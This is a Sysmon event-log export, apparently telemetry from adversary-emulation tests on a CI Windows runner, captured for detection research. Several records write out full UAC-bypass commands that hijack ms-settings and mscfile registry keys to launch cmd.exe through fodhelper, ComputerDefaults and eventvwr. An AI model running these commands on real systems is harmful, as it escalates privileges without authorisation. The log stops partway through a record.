"12/17/2025 8:02:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:51.551
ProcessGuid: {f995aebf-63ab-6942-ce05-000000000e00}
ProcessId: 1292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:51.324
ProcessGuid: {f995aebf-63ab-6942-ca05-000000000e00}
ProcessId: 516
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63ab-6942-c905-000000000e00}
ParentProcessId: 7928
ParentImage: C:\Windows\System32\fodhelper.exe
ParentCommandLine: ""C:\Windows\System32\fodhelper.exe"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:50.905
ProcessGuid: {f995aebf-63aa-6942-c705-000000000e00}
ProcessId: 2624
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hhkhjhgp.cg0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:50.880
ProcessGuid: {f995aebf-63aa-6942-c705-000000000e00}
ProcessId: 2624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hhkhjhgp.cg0.ps1
CreationUtcTime: 2025-12-17 08:02:50.880
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:50.734
ProcessGuid: {f995aebf-63aa-6942-c705-000000000e00}
ProcessId: 2624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\fodhelper.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:50.451
ProcessGuid: {f995aebf-63aa-6942-c305-000000000e00}
ProcessId: 7264
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63aa-6942-c205-000000000e00}
ParentProcessId: 9204
ParentImage: C:\Windows\System32\fodhelper.exe
ParentCommandLine: fodhelper.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:50.231
ProcessGuid: {f995aebf-63aa-6942-be05-000000000e00}
ProcessId: 5916
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f & fodhelper.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.936
ProcessGuid: {f995aebf-63a9-6942-ba05-000000000e00}
ProcessId: 2536
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63a9-6942-b805-000000000e00}
ParentProcessId: 7432
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\eventvwr.msc\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:49.585
ProcessGuid: {f995aebf-63a9-6942-b805-000000000e00}
ProcessId: 7432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nb1ctdie.5ca.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:49.564
ProcessGuid: {f995aebf-63a9-6942-b805-000000000e00}
ProcessId: 7432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nb1ctdie.5ca.ps1
CreationUtcTime: 2025-12-17 08:02:49.564
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.485
ProcessGuid: {f995aebf-63a9-6942-b805-000000000e00}
ProcessId: 7432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\eventvwr.msc\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.239
ProcessGuid: {f995aebf-63a9-6942-b705-000000000e00}
ProcessId: 1344
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63a9-6942-b605-000000000e00}
ParentProcessId: 6680
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe  /c eventvwr.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.176
ProcessGuid: {f995aebf-63a9-6942-b605-000000000e00}
ProcessId: 6680
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe  /c eventvwr.msc
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63a9-6942-b305-000000000e00}
ParentProcessId: 7740
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & cmd.exe /c eventvwr.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:49.141
ProcessGuid: {f995aebf-63a9-6942-b305-000000000e00}
ProcessId: 7740
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & cmd.exe /c eventvwr.msc
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:48 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:48.866
ProcessGuid: {f995aebf-63a8-6942-b205-000000000e00}
ProcessId: 5392
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:46.701
ProcessGuid: {f995aebf-63a6-6942-af05-000000000e00}
ProcessId: 9332
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mq5flwkk.p2j.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:46.681
ProcessGuid: {f995aebf-63a6-6942-af05-000000000e00}
ProcessId: 9332
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mq5flwkk.p2j.ps1
CreationUtcTime: 2025-12-17 08:02:46.681
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.601
ProcessGuid: {f995aebf-63a6-6942-af05-000000000e00}
ProcessId: 9332
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:46.402
ProcessGuid: {f995aebf-63a6-6942-ae05-000000000e00}
ProcessId: 7088
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.383
ProcessGuid: {f995aebf-63a6-6942-ad05-000000000e00}
ProcessId: 2000
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /del ""T1136.001_Admin"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-63a6-6942-ab05-000000000e00}
ParentProcessId: 8164
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /del ""T1136.001_Admin"" >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:46.360
ProcessGuid: {f995aebf-63a6-6942-ab05-000000000e00}
ProcessId: 8164
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /del ""T1136.001_Admin"" >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:46 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:46.138
ProcessGuid: {f995aebf-63a5-6942-a905-000000000e00}
ProcessId: 5688
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:45.921
ProcessGuid: {f995aebf-63a5-6942-a905-000000000e00}
ProcessId: 5688
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pm1avbwd.i0q.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:45 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:45.900
ProcessGuid: {f995aebf-63a5-6942-a905-000000000e00}
ProcessId: 5688
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pm1avbwd.i0q.ps1
CreationUtcTime: 2025-12-17 08:02:45.900
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:45.823
ProcessGuid: {f995aebf-63a5-6942-a905-000000000e00}
ProcessId: 5688
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-LocalUser -Name \""""T1136.001_PowerShell\"""" -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:43.763
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 1.160.21.172.in-addr.arpa.
QueryStatus: 0
QueryResults: type: 12 runnervm8j6r3;
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:45 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:43.731
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 255.175.21.172.in-addr.arpa.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:45 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:02:43.715
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 255.15.1.10.in-addr.arpa.
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:02:45 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:45.630
ProcessGuid: {f995aebf-63a5-6942-a805-000000000e00}
ProcessId: 8720
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:45.609
ProcessGuid: {f995aebf-63a5-6942-a705-000000000e00}
ProcessId: 8500
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /del ""T1136.001_CMD"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-63a5-6942-a505-000000000e00}
ParentProcessId: 5664
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:45.586
ProcessGuid: {f995aebf-63a5-6942-a505-000000000e00}
ProcessId: 5664
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:45.366
ProcessGuid: {f995aebf-63a5-6942-a405-000000000e00}
ProcessId: 2852
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
